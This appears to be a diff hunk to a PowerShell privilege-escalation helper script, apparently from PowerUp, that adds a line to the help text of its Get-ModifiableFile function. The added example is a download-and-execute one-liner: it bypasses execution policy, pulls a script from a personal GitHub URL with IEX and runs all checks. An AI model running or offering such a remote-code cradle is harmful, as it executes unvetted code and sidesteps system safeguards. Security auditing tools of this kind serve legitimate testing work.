@@ -22,9 +22,9 @@ function Get-ModifiableFile {
         Helper to return any modifiable file that's a part of a passed string.
         
     .EXAMPLE
-
+        powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/simonpunk/simon/master/PowerUp.ps1'); Invoke-AllChecks"
         PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile
-
+        
         Return the paths "C:\Temp\blah.bat" or "C:\Temp\config.ini" if they are
         modifable by the current user context.
 #>
